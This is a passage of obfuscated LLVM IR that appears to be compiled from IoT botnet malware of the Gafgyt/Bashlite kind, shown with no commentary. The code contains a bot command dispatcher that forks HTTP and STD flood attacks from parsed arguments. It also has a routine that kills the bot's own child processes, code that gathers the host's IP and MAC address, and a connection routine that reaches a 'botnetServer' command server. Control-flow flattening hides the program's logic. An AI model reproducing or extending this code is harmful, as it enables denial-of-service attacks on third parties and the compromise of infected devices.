  %448 = load i32, i32* %3, align 4
  %449 = icmp slt i32 %448, 6
  %450 = select i1 %449, i32 -1704427050, i32 2021250991
  store i32 %450, i32* %switchVar
  br label %loopEnd

; <label>:451:                                    ; preds = %loopEntry
  %452 = load i8**, i8*** %4, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 3
  %454 = load i8*, i8** %453, align 8
  %455 = call i32 @atoi(i8* %454) #9
  %456 = icmp slt i32 %455, 1
  %457 = select i1 %456, i32 -1704427050, i32 1427977648
  store i32 %457, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = load i8**, i8*** %4, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 5
  %461 = load i8*, i8** %460, align 8
  %462 = call i32 @atoi(i8* %461) #9
  %463 = icmp slt i32 %462, 1
  %464 = select i1 %463, i32 -1704427050, i32 -632175934
  store i32 %464, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = call i32 @listFork()
  %468 = icmp ne i32 %467, 0
  %469 = select i1 %468, i32 576115112, i32 499023425
  store i32 %469, i32* %switchVar
  br label %loopEnd

; <label>:470:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = load i8**, i8*** %4, align 8
  %473 = getelementptr inbounds i8*, i8** %472, i64 1
  %474 = load i8*, i8** %473, align 8
  %475 = load i8**, i8*** %4, align 8
  %476 = getelementptr inbounds i8*, i8** %475, i64 2
  %477 = load i8*, i8** %476, align 8
  %478 = load i8**, i8*** %4, align 8
  %479 = getelementptr inbounds i8*, i8** %478, i64 3
  %480 = load i8*, i8** %479, align 8
  %481 = call i32 @atoi(i8* %480) #9
  %482 = trunc i32 %481 to i16
  %483 = load i8**, i8*** %4, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 4
  %485 = load i8*, i8** %484, align 8
  %486 = load i8**, i8*** %4, align 8
  %487 = getelementptr inbounds i8*, i8** %486, i64 5
  %488 = load i8*, i8** %487, align 8
  %489 = call i32 @atoi(i8* %488) #9
  %490 = load i8**, i8*** %4, align 8
  %491 = getelementptr inbounds i8*, i8** %490, i64 6
  %492 = load i8*, i8** %491, align 8
  %493 = call i32 @atoi(i8* %492) #9
  call void @SendHTTPHex(i8* %474, i8* %477, i16 zeroext %482, i8* %485, i32 %489, i32 %493)
  call void @exit(i32 0) #11
  unreachable

; <label>:494:                                    ; preds = %loopEntry
  %495 = load i8**, i8*** %4, align 8
  %496 = getelementptr inbounds i8*, i8** %495, i64 0
  %497 = load i8*, i8** %496, align 8
  %498 = call i32 @strcmp(i8* %497, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i32 0, i32 0)) #9
  %499 = icmp ne i32 %498, 0
  %500 = select i1 %499, i32 549567755, i32 -1372321835
  store i32 %500, i32* %switchVar
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  %502 = load i32, i32* %3, align 4
  %503 = icmp slt i32 %502, 4
  %504 = select i1 %503, i32 -1962106719, i32 -1439748970
  store i32 %504, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  %506 = load i8**, i8*** %4, align 8
  %507 = getelementptr inbounds i8*, i8** %506, i64 2
  %508 = load i8*, i8** %507, align 8
  %509 = call i32 @atoi(i8* %508) #9
  %510 = icmp slt i32 %509, 1
  %511 = select i1 %510, i32 -1962106719, i32 -1022036048
  store i32 %511, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  %513 = load i8**, i8*** %4, align 8
  %514 = getelementptr inbounds i8*, i8** %513, i64 3
  %515 = load i8*, i8** %514, align 8
  %516 = call i32 @atoi(i8* %515) #9
  %517 = icmp slt i32 %516, 1
  %518 = select i1 %517, i32 -1962106719, i32 -270431427
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 1
  %523 = load i8*, i8** %522, align 8
  store i8* %523, i8** %25, align 8
  %524 = load i8**, i8*** %4, align 8
  %525 = getelementptr inbounds i8*, i8** %524, i64 2
  %526 = load i8*, i8** %525, align 8
  %527 = call i32 @atoi(i8* %526) #9
  store i32 %527, i32* %26, align 4
  %528 = load i8**, i8*** %4, align 8
  %529 = getelementptr inbounds i8*, i8** %528, i64 3
  %530 = load i8*, i8** %529, align 8
  %531 = call i32 @atoi(i8* %530) #9
  store i32 %531, i32* %27, align 4
  %532 = load i8*, i8** %25, align 8
  %533 = call i8* @strstr(i8* %532, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %534 = icmp ne i8* %533, null
  %535 = select i1 %534, i32 -304837271, i32 -1124586084
  store i32 %535, i32* %switchVar
  br label %loopEnd

; <label>:536:                                    ; preds = %loopEntry
  %537 = load i8*, i8** %25, align 8
  %538 = call i8* @strtok(i8* %537, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %538, i8** %28, align 8
  store i32 -1525998357, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = load i8*, i8** %28, align 8
  %541 = icmp ne i8* %540, null
  %542 = select i1 %541, i32 -434286297, i32 -1027729449
  store i32 %542, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = call i32 @listFork()
  %545 = icmp ne i32 %544, 0
  %546 = select i1 %545, i32 1807203188, i32 -899876572
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8*, i8** %28, align 8
  %549 = load i32, i32* %26, align 4
  %550 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %548, i32 %549, i32 %550)
  call void @_exit(i32 0) #12
  unreachable

; <label>:551:                                    ; preds = %loopEntry
  %552 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %552, i8** %28, align 8
  store i32 -1525998357, i32* %switchVar
  br label %loopEnd

; <label>:553:                                    ; preds = %loopEntry
  store i32 1179137503, i32* %switchVar
  br label %loopEnd

; <label>:554:                                    ; preds = %loopEntry
  %555 = call i32 @listFork()
  %556 = icmp ne i32 %555, 0
  %557 = select i1 %556, i32 472547646, i32 -1831215547
  store i32 %557, i32* %switchVar
  br label %loopEnd

; <label>:558:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i8*, i8** %25, align 8
  %561 = load i32, i32* %26, align 4
  %562 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %560, i32 %561, i32 %562)
  call void @_exit(i32 0) #12
  unreachable

; <label>:563:                                    ; preds = %loopEntry
  store i32 549567755, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  %565 = load i8**, i8*** %4, align 8
  %566 = getelementptr inbounds i8*, i8** %565, i64 0
  %567 = load i8*, i8** %566, align 8
  %568 = call i32 @strcmp(i8* %567, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.160, i32 0, i32 0)) #9
  %569 = icmp ne i32 %568, 0
  %570 = select i1 %569, i32 2134979631, i32 1616966508
  store i32 %570, i32* %switchVar
  br label %loopEnd

; <label>:571:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  store i32 1136214991, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  %573 = load i64, i64* %30, align 8
  %574 = load i64, i64* @numpids, align 8
  %575 = icmp ult i64 %573, %574
  %576 = select i1 %575, i32 1352161794, i32 -366197492
  store i32 %576, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  %578 = load i32*, i32** @pids, align 8
  %579 = load i64, i64* %30, align 8
  %580 = getelementptr inbounds i32, i32* %578, i64 %579
  %581 = load i32, i32* %580, align 4
  %582 = icmp ne i32 %581, 0
  %583 = select i1 %582, i32 -326721469, i32 2088358072
  store i32 %583, i32* %switchVar
  br label %loopEnd

; <label>:584:                                    ; preds = %loopEntry
  %585 = load i32*, i32** @pids, align 8
  %586 = load i64, i64* %30, align 8
  %587 = getelementptr inbounds i32, i32* %585, i64 %586
  %588 = load i32, i32* %587, align 4
  %589 = call i32 @getpid() #3
  %590 = icmp ne i32 %588, %589
  %591 = select i1 %590, i32 194695497, i32 2088358072
  store i32 %591, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  %593 = load i32*, i32** @pids, align 8
  %594 = load i64, i64* %30, align 8
  %595 = getelementptr inbounds i32, i32* %593, i64 %594
  %596 = load i32, i32* %595, align 4
  %597 = call i32 @kill(i32 %596, i32 9) #3
  %598 = load i32, i32* %29, align 4
  %599 = add nsw i32 %598, 1
  store i32 %599, i32* %29, align 4
  store i32 2088358072, i32* %switchVar
  br label %loopEnd

; <label>:600:                                    ; preds = %loopEntry
  store i32 1471689713, i32* %switchVar
  br label %loopEnd

; <label>:601:                                    ; preds = %loopEntry
  %602 = load i64, i64* %30, align 8
  %603 = add i64 %602, 1
  store i64 %603, i64* %30, align 8
  store i32 1136214991, i32* %switchVar
  br label %loopEnd

; <label>:604:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:605:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %604, %601, %600, %592, %584, %577, %572, %571, %564, %563, %558, %554, %553, %551, %543, %539, %536, %520, %519, %512, %505, %501, %494, %470, %466, %465, %458, %451, %447, %440, %416, %412, %411, %404, %397, %393, %386, %385, %384, %372, %371, %369, %357, %353, %350, %345, %344, %339, %335, %334, %329, %307, %306, %299, %295, %288, %284, %277, %270, %263, %256, %252, %245, %244, %243, %230, %229, %227, %214, %210, %207, %202, %201, %196, %192, %191, %186, %182, %181, %176, %153, %152, %145, %141, %134, %127, %120, %113, %106, %99, %92, %88, %81, %80, %76, %75, %71, %69, %64, %63, %59, %52, %49, %48, %44, %37, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 234366639, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 234366639, label %first
    i32 -923341126, label %16
    i32 -1891485552, label %17
    i32 1294353232, label %31
    i32 -1097390076, label %32
    i32 220573247, label %39
    i32 810906697, label %40
    i32 190579393, label %45
    i32 -1679605675, label %51
    i32 -519220920, label %56
    i32 -1915682798, label %58
    i32 1880987434, label %64
    i32 -1112924024, label %67
    i32 1075907184, label %69
    i32 1624573638, label %71
    i32 1078376418, label %78
    i32 -2008753082, label %86
    i32 -769539982, label %90
    i32 -1582433953, label %102
    i32 2002366605, label %105
    i32 1727882773, label %106
    i32 -1032108480, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -923341126, i32 -1891485552
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1032108480, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.161, i32 0, i32 0)) #3
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #10
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 1294353232, i32 -1097390076
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1032108480, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #3
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 220573247, i32 810906697
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1032108480, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.162, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 190579393, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 -1679605675, i32 1624573638
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.163, i32 0, i32 0)) #9
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 -519220920, i32 1075907184
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 -1915682798, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 1880987434, i32 -1112924024
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 -1915682798, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 1624573638, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 190579393, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 1078376418, i32 1727882773
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.4* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #3
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #3
  store i32 0, i32* %10, align 4
  store i32 -2008753082, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 -769539982, i32 2002366605
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.5* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 -1582433953, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 -2008753082, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 1727882773, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -1032108480, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca %union.anon.6, align 4
  %3 = bitcast %union.anon.6* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %union.anon.6* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %union.anon.6* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %union.anon.6* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %union.anon.6* %2 to i32*
  %12 = load i32, i32* %11, align 4
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1315722145, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar11 = load i32, i32* %switchVar
  switch i32 %switchVar11, label %switchDefault [
    i32 1315722145, label %NodeBlock9
    i32 740521522, label %NodeBlock7
    i32 1753094987, label %LeafBlock5
    i32 -782313509, label %LeafBlock3
    i32 1661489961, label %NodeBlock
    i32 1101603498, label %LeafBlock1
    i32 -1236295365, label %LeafBlock
    i32 1831954859, label %20
    i32 -1228376808, label %21
    i32 -697310875, label %22
    i32 -1836766449, label %23
    i32 82294310, label %NewDefault
    i32 -1072955489, label %24
    i32 -437869864, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload17 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload17, 33751041
  %13 = select i1 %Pivot10, i32 1661489961, i32 740521522
  store i32 %13, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem
  %Pivot8 = icmp slt i32 %.reload13, 50462976
  %14 = select i1 %Pivot8, i32 -782313509, i32 1753094987
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock5:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf6 = icmp eq i32 %.reload, 50462976
  %15 = select i1 %SwitchLeaf6, i32 -1228376808, i32 82294310
  store i32 %15, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload12, 33751041
  %16 = select i1 %SwitchLeaf4, i32 -697310875, i32 82294310
  store i32 %16, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload16, 16777986
  %17 = select i1 %Pivot, i32 -1236295365, i32 1101603498
  store i32 %17, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload14 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload14, 16777986
  %18 = select i1 %SwitchLeaf2, i32 -1836766449, i32 82294310
  store i32 %18, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload15 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload15, 66051
  %19 = select i1 %SwitchLeaf, i32 1831954859, i32 82294310
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 ptrtoint ([11 x i8]* @.str.164 to i32), i32* %1, align 4
  store i32 -437869864, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 ptrtoint ([14 x i8]* @.str.165 to i32), i32* %1, align 4
  store i32 -437869864, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 ptrtoint ([13 x i8]* @.str.166 to i32), i32* %1, align 4
  store i32 -437869864, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 ptrtoint ([16 x i8]* @.str.167 to i32), i32* %1, align 4
  store i32 -437869864, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1072955489, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 ptrtoint ([8 x i8]* @.str.168 to i32), i32* %1, align 4
  store i32 -437869864, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %24, %NewDefault, %23, %22, %21, %20, %LeafBlock, %LeafBlock1, %NodeBlock, %LeafBlock3, %LeafBlock5, %NodeBlock7, %NodeBlock9, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @KadenCommStock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -259200998, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -259200998, label %first
    i32 -987291179, label %8
    i32 -366584417, label %11
    i32 -952786382, label %17
    i32 1864010196, label %18
    i32 1683177701, label %21
    i32 -854260011, label %32
    i32 -81643347, label %39
    i32 1878325953, label %47
    i32 476859041, label %48
    i32 -59393308, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 -987291179, i32 -366584417
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @KadenCommStock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @KadenCommStock, align 4
  store i32 -366584417, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @botnetServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -952786382, i32 1864010196
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @botnetServer, align 4
  store i32 1683177701, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @botnetServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @botnetServer, align 4
  store i32 1683177701, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @botnetServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @ServerInfo, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #3
  store i32 27, i32* %3, align 4
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #9
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 -854260011, i32 -81643347
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #9
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #9
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #9
  store i8 0, i8* %38, align 1
  store i32 -81643347, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %40, i32* @KadenCommStock, align 4
  %41 = load i32, i32* @KadenCommStock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 476859041, i32 1878325953
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -59393308, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -59393308, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
